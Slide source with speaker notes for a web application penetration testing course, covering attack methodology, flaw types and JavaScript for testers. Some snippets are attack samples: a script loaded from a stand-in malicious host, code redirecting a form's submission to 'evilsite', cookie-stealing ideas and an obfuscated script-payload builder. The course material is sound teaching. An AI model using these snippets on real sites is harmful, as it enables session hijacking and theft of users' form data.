The second step in our attack process is mapping.  This step usually takes the least amount of time, but if it is not done correctly, all of the later steps are either more difficult or impossible.

During the mapping phase, we try to understand how all the pieces of an application fit together, and identify places where we may be able to leverage the relationships between pages for greater access. Typically, service, OS and application enumeration and identification also occurs here. 

Mapping the application enables the attacker to see all of the various pieces of the application in one place. We also collect session identifiers during this mapping, so that we can gain a better understanding of how session state is maintained.

There are three main steps to mapping.  First, download the entire site by spidering the server.  Next, use the results from that step to figure out how things fit together and understand the application's flow.  While performing those two steps, the third step is to gather various session ids and tokens.  These will be useful in identifying potential vulnerabilities.

---

# Discovery

- The discovery step focuses on finding the issues
	- Not exploiting them
- Some exploitation will happen due to the nature of the flaw
	- Directory browsing is one example
	- The only way to find the flaw is by exercising it in a relatively benign fashion
- This phase will focus on finding:
	- Common applications
	- User interfaces
	- Information leakage
	- Authentication systems
	- Error messages
- We also build most of our scripts in this step
	- Some will be built during exploitation

Note:
The discovery phase is the third step in our methodology, and the first step that involves potentially malicious traffic.  This step is where we will begin to explore the application and find its vulnerable spots.

Discovery is where we really start to explore the application in a much deeper way. We will search for potential vulnerabilities and information we can use to plan the attack in the next phase.  

As part of the discovery phase, we will begin to identify weaknesses within the application. We will expand our application map, and begin building and using our attack tools.  This can involve actually writing scripts or tools designed to take advantage of a specific site configuration or weakness.

---

# Exploitation

- Exploitation involves actually attacking the flaws in an application
	- Exercising its flaws to see what their implications are
- Each exploit builds a foothold into the application
	- We then further that foothold through cycling through the process
- The tester should strive to see if a flaw in an application can be used to give the attacker control or access to other parts of the infrastructure that are also included in scope

Note:
Exploitation is the final step in the attack.  This is the step where the attacker will take all of the information gathered up to this point, and use it to exploit the application.  As we will see, this can involve dumping a database, or pivoting through the application to attack the rest of the network.

Exploitation is when we launch our attacks. A lot of penetration testers focus on this stage, to the detriment of their testing, since exploitation builds upon all of the information we have gathered and tasks we have completed up to this point.  Without the first three steps, exploitation typically fails.

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/114/web-exploitation-illustrated.png)

---

# Cyclical Attack

- Once exploitation happens, don't stop
- Follow the process again …
	- … From that point, looking for new attack surface
	- Each successfully exploited vulnerability usually opens new avenues for:
		- Mapping new parts of the application
		- Additional applications now accessible
		- And possibly even the network infrastructure
- Other vulnerabilities exist
- Our job is to find them!

Note:
Remember, as we discussed earlier, the attack process is cyclical in nature.  When we exploit a vulnerability, we start the process again, leveraging our new access and information. Unlike the evil attackers, the job of penetration testers is to find as many of the vulnerabilities as possible -- not simply to grab data and run!

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/115/pivoting-illustrated.png)

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- ***Types of Flaws***
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
In the next section, we outline the various types of flaws we will be covering in class. There are three types of exploitation that we are going to cover in this class.  "Leakage" involves the disclosure of information.  "Bypass" is when the attacker is able to circumvent some form of authentication or logic.  "Input" is when the attacker is able to enter data that will cause problems within the application or the clients of the application.

---

# Information Leakage Flaws

- Information leakage flaws allow an attacker to discover information regarding the application
	- Infrastructure information
		- Web server type, back-end database type, operating system type, version numbers of each of these, etc.  
	- Pathing
		- Where are the application components installed on the target machine's file system?
	- Code base
		- Can we download the application's code?
	- Data store
		- Where is the backend data store and what is it?
	- Usernames and/or passwords
		- Obvious targets

Note:
A leakage flaw allows the attacker to discover information about application configuration or state. This information can be used to launch much more damaging attacks when a focused attacker is at work.

Leakage flaws occur surprisingly often in the real world.  When penetration testers point them out to developers, a common response is, "That's ok, what kind of harm can come from that?"  The value of information gathered from leakage flaw is frequently underestimated. The smart attacker can leverage information such as application installation paths and database error messages to plan their attack. These messages will even be useful in attack execution, as we will see during exploitation.

---

# Configuration Flaws

- Configuration issues with the web server or its underlying operating system
- These issues could allow an attacker to exploit the system, no matter how secure the application
- Commonly caused by miscommunication between what the application needs and the way the server is configured
- May disclose information or expose vulnerabilities

Note:
Configuration issues with the web server or its operating system can allow the attacker to exploit the system no matter how secure the application was designed.  It is very common for this to happen because there is little communication or bad communication between the developers and the administrators.

---

# Bypass Flaws

- Bypass flaws allow an attacker to bypass or avoid various controls
	- Authentication bypass
		- Access the application without logging in
	- Authorization bypass
		- Accessing resources not meant for a given user, such as jumping from one user to another or gaining access to administrative functionality
	- File control bypass
		- Access files outside the web root or not part of the application
	- Front-end bypass
		- Interact with backend systems directly
			- Querying a web service directly
			- Accessing systems without authenticating to a single-sign-on system first

Note:
Bypass flaws allow the attacker to circumvent controls.  This may gain the attacker more access
within the application, or even allow him or her to access and modify files on the server.

- Authentication Bypass:  Some portion of the application allows us to provide it with session information such as who we want to be, without going through the authentication process.

- Authorization Bypass:  Some pages assume that a user has gone through another page which validates authorization.  By directly visiting the links, these pages can be accessed without such authorization taking place.  Session fixation also falls into this category.

- File Control Bypass:  Files are made available which are not intended for general consumption.  Log files, source code, and confidential information are often the fruits of these attacks.

- Front End Bypass:  Back-end resources are directly accessible.  This can include web services, databases, and partner resources, among other things.

---

# Injection Flaws

- Injecting code into some form of user input, with the goal of an interpreter somewhere processing it
- Some examples are:
	- Command Injection
		- Targets the operating system
	- Code Injection
		- Targets the application
	- SQL Injection
		- Targets the backend data store
	- Cross Site Scripting (XSS)
		- Targets the clients of an application
	- HTTP Response Splitting
		- Enhances other attacks
	- Cross Site Request Forgery (CSRF)
		- Targets the trust an application has in the user

Note:
Input flaws are very common, and fundamental to well-known attacks such as SQL Injection and Cross Site Scripting.  They occur when the developer has placed too much trust in the client, and accepted input with inadequate filtering.  This allows an attacker to inject malicious items that the application or the client acts upon.

Some examples are:
- Command Injection
	- An attacker can run commands on the server through the application.
- Code Injection
	- Code such as PHP or VB is run within the application.
- SQL Injection
	- The attacker can control a query within the web app.
- Cross Site Scripting (XSS)
	- An attacker can inject client-side code.
- HTTP Response Splitting
	- An attacker is able to inject headers that will be reflected to the client.
- Cross Site Request Forgery (CSRF)
	- An attacker can inject a transaction via a legitimate user.

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide?
  -->
![](assets/day1/120/injection-example-diagram.png)

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- ***JavaScript for Pen Testers***
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
This section is an overview of JavaScript.  We will explore the language basics and how to write scripts used during a penetration test.

---

# Why JavaScript for<br />Web App Pen Testers?

- JavaScript is the most common client-side scripting language today
- Web app pen testers must therefore understand JavaScript for two reasons:
	- To read and understand scripts from target systems
		- Discover issues with the application
		- Determine how the application runs on the client
	- To write our own attacks against target systems
		- Changing the content of a page to redirect a form submission
		- Steal cookies to hijack sessions
		- Many, many other possibilities here

Note:
While browsers support languages such as VBScript and ActionScript, we have chosen JavaScript due to its popularity.  Web app penetration testers have two separate reasons to understand JavaScript.  First, as we evaluate an application, we need to understand how the client language is behaving and look for issues within the code.  Second, when we try to launch XSS attacks we will need to be able to write at least basic scripts.  This section will help to get us to both goals.

---

# JavaScript

- Designed by Netscape in 1995
- Originally named LiveScript
	- Name was changed to JavaScript
- Despite the name, it is not directly related to Java
	- Java and JavaScript are very different languages with very different interpreters
- JavaScript is a dynamic language for client-side scripting
- Mainly used in websites
	- But JavaScript is also used by other applications, such as Adobe Reader

Note:
Netscape designed and released LiveScript in 1995, the name was quickly changed to JavaScript.  While the name commonly causes people to think that JavaScript and Java are related, this is not true.  While JavaScript is mainly used by web sites, keep in mind that many other client applications such as e-mail clients and pdf readers support JavaScript embedded in their documents.

+++

```js
var target_ip = 'IP_ADDRESS';
var target_port = '220';
var payload = "";

var scr_l = '<scr' + 'ipt\>';
var scr_r = '</scr' + 'ipt>';
var max_line_len = 23;

payload += "ls\\\n";

function add_line(cmd) {
	payload += "echo -n '" + scr_l + "'\\\n";
	payload += "echo " + cmd + "\\\n";
	payload += "echo '" + scr_r + "'\\\n";
}
```

---

# JavaScript Use in Web Pages

- The focus in this course is web pages
- JavaScript can be inline with HTML
	- As a script tag  
		**`<script>alert("PEWAPT101 Rocks")</script>`**
	- As part of an HTML item  
		**`<img src="images/logo.gif" onload="javascript:alert('Loaded');">`**
- Can also be loaded from another document  
	**`<script src=http://professionallyevil.com/malicious.js>`**
- It is common to see any one or more of these in the same HTML page

Note:
In this course we will focus on the use of JavaScript within web pages.  JavaScript can be used within a web pages in two different and distinct ways.  The first is to use script tags.  Either the code can be within the tags or referenced by a src attribute.  The second method of loading JavaScript is as an attribute of an HTML tag.  An example of this would be the onunload event of a body tag.

+++

<!-- Add inline images instead of featuring as separate slide? -->
![](assets/day1/124/sample-chrome-alertbox.png)
![](assets/day1/124/sample-safari-alertbox.png)

---

# JavaScript Fundamentals

- Each statement is a command to the browser
	- There are differences in how each browser interprets some JavaScript particulars… that can be frustrating, but let's cover the most common aspects of JavaScript here
- The entire language is case sensitive
- Combines related statements into blocks
	- Each block is delimited by {}  
		**`if (location.port != 443) {`**  
		**`	alert("No SSL support!")`**  
		**`	}`**
- Use a // for single line comments  
	**`// This code causes burning!`**
- Multi-line comments use the /* */ characters
	**`/* This code was written by`**  
	**`Jason Wood and James Jardine */`**

Note:
JavaScript is similar to other languages in that each statement in the code is a command to the browser.  Of course we wouldn't be talking about web browsers without mentioning that each browser interprets parts of JavaScript in slightly different ways.

There are a few points to note regarding JavaScript.  First, it is entirely case sensitive.  This means that the variable "name" is different than the variable "Name".  You can also use the double slash to comment the rest of that line, while the slash asterisk combination in a multi-line comment.  It ends at the asterisk slash characters.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- ***Statements, Variables, Functions, & Events***
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
In this next section, we will discuss the various functions and events within JavaScript.  We will also learn about statements and how JavaScript handles variables.

---

# Conditional Statements

## If…Else Statement
- Chooses between two conditions
- The else block is optional

```js
if (/*condition*/)
{
	/* code if condition is true */
}
else
{
	/* code if condition is not true */
}
```
- Example conditions:
	- `n == 42`
	- `varName != "Lions"`

Note:
The first type of statement we will look at is the if/else condition.  This allows the code to check the value of a condition and perform an action if it is true.  For example, check to see if the user agent is defined as IE and load the correct AJAX object.  The else statement is an optional block to perform an action if the condition is false.

+++

## Switch Statement
- Chooses between multiple conditions
- Each case runs until a break is encountered
- If no break, multiple cases will run
- Default condition is optional

```js
switch (n)
{
	case 1:
		/* execute code */
		break;
	case 2:
		/* execute code */
		break;
	default:
		/* default code */
}
```

- Case statements can match on integers or strings:  
	`case "Pen-Test":`

Note:
The next statement is a switch statement.  This allows the programmer to set different actions based on a series of conditions.  Each set of commands is finished by reaching a break statement.  If there isn't a break, the break continues to run commands until one is reached.  This allows for multiple conditions to share commands without repeating the code.

---

# Control Statements

## While Loop
Continues running the code block until the end value condition is met

```js
while (i<=10)
{
	alert(i); // Pops up a dialog with the value of i
	i++; // increments variable
}
```

Note:
The while statement is the way to run a block of code until a condition is met.  This allows the developer to build the loop without knowing the exact number of times that code must be run.  An example of the way to use this may be to retrieve a web page until it doesn't match the content the code expected.  When this happens, the code would send an alert.

+++

## For Loop
Runs the code block a specified number of times

```js
for (x=0;x<=5;x++)
{
	alert("Knock, knock");
	alert("Banana");
	x++;
}
alert("Knock, knock");
alert("Orange");
alert("Orange you glad I didn't say 'Banana'");
```

Note:
The for loop behaves the same way, except instead of a condition it runs a set number of times.

+++

<!-- Add inline image instead of featuring as separate slide? -->
![](assets/day1/128/ring-ring-ring-ring-ring-ring-ring-banana-phone.png)

---

# JavaScript Variables

- JavaScript variables are loosely typed
	- Any type of data can be assigned to a variable without concern about whether it is a string, integer, etc.
- Declaration is as simple as: **`var x;`**
- Values can be assigned at declaration … **`var x="Sarah";`**
- … or later with: **`x="Sarah";`**
- Note that if a variable is re-declared after a value is assigned to it, the original value is still assigned
- Variables declared outside of functions are accessible everywhere in the script
	- Variables declared in a function are only available in that function

Note:
JavaScript variables are loosely typed.  This means that unlike some languages, the variable can hold any type of data, instead of being limited by how it was declared.  Declaration of a variable is as simple as typing the keyword var followed by the variable name.  The developer can also assign a value while declaring it by placing an equal sign followed by the value.

One interesting note about variables is that if a variable is re-declared after it has had a value assigned, it will continue to have the value assigned.

The scope of variables is global unless declared within a function, in which case they are only accessible within that function.

---

# Functions

- JavaScript functions can be declared anywhere in the page
	- Typically safest to declare them in the <HEAD> to ensure they are loaded before being called  
		**`function {{name}} ({{var}},{{var}}) {`**  
		**`	code to execute`**  
		**`}`**
- To return data from a function, use the **`return var;`** statement within the function
- To call a function use **`name();`**
- A function to alert the user then redirects the browser to the specified URL

```js
function alertRedirect(url) {
	alert("Redirecting...")
	window.location = url
}
```

Note:
JavaScript allows for creating functions so that code can be called over and over again instead of having the developer type it again.  These functions can be declared anywhere on the page, but it is convenient to place them in the <head> section of the page so that they are loaded before being called.

Functions can either just run, or they can return a value to where they were called by using the return statement followed by the value that the developer wishes to return.

---

# Events

- Every item in a page has a series of associated events
- Typically the event calls a function
- This table lists some of the JavaScript events

<table>
<tr><th>Event</th><th>Description</th></tr>
<tr><td><pre>onload</pre></td><td>Page or item (image, css, or script) is finished loading</td></tr>
<tr><td><pre>onunload</pre></td><td>User leavess the page the script is on</td></tr>
<tr><td><pre>onerror</pre></td><td>An error occurs loading a page or item</td></tr>
<tr><td><pre>onclick</pre></td><td>Item is clicked on with the mouse</td></tr>
<tr><td><pre>onsubmit</pre></td><td>The form is submitted</td></tr>
<tr><td><pre>onfocus</pre></td><td>The item receives focus</td></tr>
<tr><td><pre>onblur</pre></td><td>The item loses focus</td></tr>
<tr><td><pre>onchange</pre></td><td>Content of the field changes</td></tr>
<tr><td><pre>onmouseover</pre></td><td>The mouse is hovering over the item</td></tr>
<tr></tr>
</table>

Note:
Events are triggers called when an item is in a certain condition.  An example of this would be the onload event that is triggered by an image being loaded by the browser.  The table above lists a series of example events and when they are triggered.  The developer or tester can use these events within a page or item to trigger the JavaScript code they want to run.

---

# Using Events in Attacks:<br />Ideas for Pen Testers

- Let's look at some example ideas for how to use the various events
- During the exploitation phase, we will use these events to perform various attacks
- **`onload`**
	- Change content of the page after it loads
- **`onunload`**
	- Launch pop-under window to retain control of a zombie browser
- **`onsubmit`**
	- Change form values so the transaction is one of the attacker's choosing
- **`onfocus`**
	- Send http request to attacker's web server to reveal which controls the user is selecting

Note:
Now it's time to look at some examples that would be useful during a penetration test.  We recommend that each of the events is examined and try to think of different ways that they can be twisted to accomplish our goal instead of what they were originally thought of for.

For example, we might use the onload event on the body to run code that changes the content to reflect what we want the page to say.  Or we could use the onsubmit event on a form to change where the form values are sent.  The onfocus event is very useful for tracking the client's interest within the page.

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/132/event-demo-diagram.png)

---

# Using Events in Attacks:<br />More Ideas for Pen Testers

- Additional events useful to penetration testers:
- **`onerror`**
	- Used within web scanners injected via XSS to determine a resource does not exist
	- Useful when port scanning a network through JavaScript
- **`onclick`**
	- Change where a link points without the user knowing
- **`onmouseover`**
	- Track the movement of the mouse across a page
- **`onblur`**
	- Send the contents of a form field to an attacker

Note:
Some other examples of interesting events would be things like the onerror event which can be used for fingerprinting services and port scanning a network.  We may also use things like the onclick and the onblur to change where a link points or send the contents of the form field that was just completed to an attacker.

All of these events and more can be used by the tester or attacker to control the experience the user has within a page.

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/133/event-demo-diagram-2.png)

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- ***The DOM, Methods, and Properties***
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
In this next section we will discuss the document object model and the various methods and properties exposed by the built in JavaScript objects.

---

# Document Object Model (DOM)

- The DOM provides a standard interface to the document allowing scripts to dynamically access and update content, structure, or style of the page
	- The document referenced is either the HTML or XML page currently being used
- The DOM also provide native objects to access various items of interest
	- Document object refers to the whole document
		- **`document.forms[0]`** refers to the first form on the page
		- **`document.write("Hello World!")`** writes the string Hello World! to the page
		- **`document.write(document.cookie)`** will write the value of the page's cookies to the page
	- Form object is used to access a specific form
		- **`form.action =`** ***`[URL]`*** sets the form's action to the URL allowing for redirecting the browser to another page
		- **`form.submit()`** will submit the form
- We will explore many others in the exercise challenges ahead

Note:
The document object model or DOM is a standard interface provide by JavaScript that allows for dynamic access to the pieces of the current page and browser window.  The DOM provides objects such as the Form and Windows objects.  These allow for access and control of the various parts of what they represent.

---

# DOM Nodes

- The document is viewed as a tree
- The HTML tag is the root and has two children, HEAD and BODY
- Each item is a child from there

<!-- Consider converting to .svg image? -->
![](assets/day1/136/dom-illustrated.png)

Note:
The document and its window is viewed and managed as a tree.  As we can see from the diagram above, the tree starts with the HTML tag and then branches from there.  Each node from there is a child of the one above it and a parent to any below it.  Each tag may have one or more attribute assigned to it, such as color or size.

---

# JavaScript Object<br />Methods and Properties

- JavaScript is an object-oriented programming language
- Objects have to be initialized
	- **`var myString = new String();`**
- Objects have properties and methods
	- Properties are attributes of the object
	- Methods are actions performed on the object
- Developers can create their own objects
- We will focus on the built-in objects here with some examples of properties and methods that are useful for penetration testers
- When referring to a property of an object, we use the format **`object.property`**
	- **`document.referrer`**
- Calling a method is similar, but also includes () with values determined by the method
	- **`window.alert("This pop-up shows a method, alert()");`**

Note:
Since JavaScript is an object oriented programming language, it provides a series of objects, and developers can create their own.  Objects are a method to provide copies of an item in memory that can be referenced and used separately.

Objects must be initialized instead of just being assigned to a variable.  These objects can provide properties, which are attributes of the object and methods, which are actions.

---

# Objects and Their<br />Associated Properties & Methods

<!--TODO Split into columns? -->

- Object type: String
	- Property: **`length`** returns the size
	- Method: **`split()`** parses the string
	- Example: **`string.length = 42`**
- Object type: Date
	- Method: **`getTime()`** returns the current time
	- Method: **`getMonth()`** returns the current month
	- Example: **`date.getMonth() = April`**
- Object type: Math
	- Method: **`random()`** returns a random number between 0 and 1
	- Method: **`sqrt()`** returns square root of a number
	- Example: **`Math.sqrt(9) = 3;`**
- Object type: Window
	- Method: **`open()`** creates a new browser window
	- Method: **`alert()`** pops up a dialog box
	- Example: **`window.alert( "Hello World" );`**
- Object type: Document
	- Method: **`write()`** writes content to the page
	- Method: **`referrer()`** returns the referring URL
	- Example:  **`document.write("Hello");`**
- Object type: Location
	- Method: **`reload()`** reloads the document
	- Property: **`port`** returns the port of the current page
	- Example: **`location.port = 80;`**
- Object type: History
	- Method: **`back()`** is the same as the back button
	- Property: **`length`** returns history item count
	- Example: **`history.back();`**
- Object type: Array
	- Method: **`join()`** joins the elements in the array
	- Method: **`sort()`** sorts the array
	- Example: **`array.sort();`**

Note:
There are eight different built in objects provided by JavaScript.  They are the string, date, math, window, document, location, history and array objects.  These objects provide various methods and properties and make up a major part of the application code we find and use during penetration tests.

---

# Selecting and Changing Content

- Scripts can "walk" the tree to find specific elements
	- Function to count the number of `<input>` tags in a page

```js
function counttags(tag) {
	count = document.getElementsByTagName(tag).length
	return count
}
```

- The script can then read the item's attributes and associated items such as text
	- Determine the URL of an image on the page

```js
source = document.images["Logo"].src;
```

- The script can then rewrite the item
	- Rewrite the action and submit the form

```js
document.getElementById('myForm').action = "http://evilsite/";
document.getElementById('myForm').submit;
```

Note:
One of the main functions that we perform is changing content on the page.  There are various ways to find the item that we are interested in changing.  We could reference the item by its ID or by its name.  We can also loop through each of the items and change all the items of a specific type.

Once we find the item, we can use the various properties, such as the action of a form, to change the content to what we would like.

---

# Interacting with Cookies

- Reading cookies is simple  
	**`strCookie = document.cookie;`**
	- Remember document.cookie only returns the name=value pairs
- Parsing the cookie takes a little more work
	- First parse to split each name=value pair
	- **`var arrValues = document.cookie.split(';');`**
	- The next step would be to loop though each pair and split on the '='
		- Code for doing this is located in the notes
- Setting cookies requires only four parameters
	- A cookie name and value pair
	- An expiration time for the cookie and URI path that is able to access it
	- **`document.cookie = "userid=brenna;expires=Fri,27-Feb-2015;path=/";`**

Note:
Another common function used during tests is to manipulate and/or read cookies.  The attacker can read cookies by calling document.cookie object and property.  When reading cookies, the tester has two choices.  The first is to use the cookie value as a whole or we can use code similar to the listing below to parse the cookie into individual values.

```js
var a_all_cookies = document.cookie.split( ';' );
var a_temp_cookie = '';
var cookie_name = '';
var cookie_value = '';
var b_cookie_found = false;

for ( i = 0; i < a_all_cookies.length; i++ )
{
	a_temp_cookie = a_all_cookies[i].split( '=' );
	cookie_name = a_temp_cookie[0].replace(/^\s+|\s+$/g, '');

	if ( cookie_name == check_name )
	{
		b_cookie_found = true;
		if ( a_temp_cookie.length > 1 )
		{
			cookie_value = unescape( a_temp_cookie[1].replace(/^\s+|\s+$/g, '') );
		}
		return cookie_value;
		break;
	}
	a_temp_cookie = null;
	cookie_name = '';
}
```

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- ***AJAX and XMLHttpRequest***
	- JavaScript Exercise

</div>

Note:
The next section will discuss the XMLHttpRequest object and AJAX.

---

# Asynchronous JavaScript<br />and XML (AJAX)

- AJAX is the technology enabling Web 2.0
- Uses JavaScript and XML to provide dynamic application functions
- Allows the application to refresh portions of the page
- This allows for more "thick" client type functionality
- Consider Google Maps
	- It shows satellite images
	- It also includes road information with traffic data overlaid
	- AJAX allows for it to use interactive features while only updating the changed sections

+++

<!-- Add inline image instead of featuring as separate slide? -->
![](assets/day1/142/gmaps-jacksonville-fl-screenshot.png)

Note:
AJAX is the technology used to enable asynchronous communication between your browser and the web server. In old-style web sites, when you click a link, the client has to send a request all the way up the server, the server processes the request and then replies. When the browser gets the entire reply, it redraws the entire screen. 

With AJAX, the JavaScript creates XMLHTTP objects. Those objects can make requests and receive responses asynchronously, updating the display as responses are received. For example, consider Google Maps. When you go to Google Maps and you search for something and slide the map, your browser uses AJAX to make calls back and forth to the server to retrieve the images that make the map. In this way, the map changes dynamically, but the remainder of the page is static and does not need to be redrawn with each change.

---

# The Mighty XMLHttpRequest

- The JavaScript XMLHttprequest object is the heart of AJAX  
- It allows a JavaScript to make requests for data in the background
	- Providing more interactivity to the web page
- Begin using the object with  
	**`xmlhttp = new XMLHttpRequest();`**

Main methods and properties:

**`xmlhttp.open("GET", "http://www.secureideas.com/index.php");`**
	- Sets up the request method, where the request will go, and what it will retrieve

**`xmlhttp.send();`**
	- Actually sends the request

**`xmlhttp.onreadystatechange = AJAXProcess`**
	- Sets which function should be called when the ready state changes
		- A response being received is an example of a ready state change
		- In this example, **`AJAXProcess`** would be a custom function

**`xmlhttp.readyState`**
	- The property that contains the current ready state

**`xmlhttp.responseText`**
	- The property that contains the contents of any response from the server

Note:
The XMLHttpRequest object has a number of methods and properties but the five below are the most critical to making it work.

- open
	- The open method specifies the properties of the request.  It does not actually initiate a connection.
- send
	- Creates the connection to the referenced URL sending the request.
- onreadystatechange
	- This property specifies the function that is called when the ready state changes.
- readyState
	- This property is set with the state of the request.
- responseText
	- The response from the server is place in this property.

---

# readyState

- The readyState is a property of the XMLHttpRequest object
- It provides information about the state of the server's response to a request sent via XMLHttpRequest
- The readyState has 5 possible values
	-  0: The request is uninitialized
	-  1: The request has been set up
	-  2: The request has been sent
	-  3: Waiting for a response
	-  4: The response is complete
- Our code uses this to take certain actions when the response has been returned

Note:
The readyState property is used quite a bit in AJAX programming.  It allows the scripting code to determine what state a response from the server is in.  The numeric representations are then used by the application code to determine which actions to run.

---

# Example Use of XMLHttpRequest:<br />Query Google Using SOAP API

<!-- Consider converting to .svg image? -->
![](assets/day1/145/example-xmlhttprequest-google-api.png)

Note:
Here is an example of how to use the XMLHttpRequest object.  At the top we initialize the object and declare a search string.  After that we set up the request and build a function to alert with the response content.  The last step on this slide is to build the POST header.

---

@title[XMLHttpRequest Diagram]

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/146/xmlhttprequest-diagram-slide.png)

Note:
On this slide, we call the send method of the object, passing in the XML string that the Google system requires for requests to its API.  The string "GOOGLEKEY" would be replaced with the API key we have.  (If we don't have one, they are no longer available.  We will cover a work around for this tomorrow.)

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- ***JavaScript Exercise***

</div>

Note:
Now that we have covered JavaScript from the perspective of a penetration tester, let's do some coding!

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
This page intentionally left blank.

---

# Conclusion of PEWAPT101.1

- In this course segment, we reviewed HTTP and the web
- We've analyzed a web application penetration testing methodology
- Thank you!

Note:
Today we have examined the web from the attacker's perspective. We have studied web protocols and applications, and discussed approaches for breaking them. Over the next five days we are going to dig deeper into that mindset.  

